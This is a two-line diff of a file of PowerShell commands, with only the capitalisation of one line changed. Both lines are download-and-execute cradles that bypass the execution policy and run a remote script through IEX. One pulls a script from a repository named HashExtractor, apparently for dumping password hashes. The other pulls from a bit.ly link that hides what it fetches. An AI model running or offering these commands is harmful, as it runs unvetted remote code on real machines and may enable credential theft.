@@ -1,2 +1,2 @@
 Powershell -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/DoTheThing.ps1')
-Powershell -exec bypass -c iex (New-Object Net.WebClient).DownloadString('https://bit.ly/3nGRlmb')
+powershell -exec bypass -c iex (New-Object Net.WebClient).DownloadString('https://bit.ly/3nGRlmb')
